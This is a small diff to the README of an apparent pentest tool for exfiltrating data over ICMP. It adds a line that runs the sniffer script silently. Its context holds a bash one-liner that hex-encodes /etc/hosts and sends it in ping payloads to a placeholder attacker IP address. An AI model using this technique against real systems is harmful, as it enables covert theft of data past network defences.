@@ -7,6 +7,10 @@ This script will be useful at the end of a pentest to steal data when otherwise 
 
 We let our sniffer listen.
 
+``` python
+python3 icmp_exfiltration.py &> /dev/null
+```
+
 ```bash
 xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line <attackers_IP_address> ; done
 ```
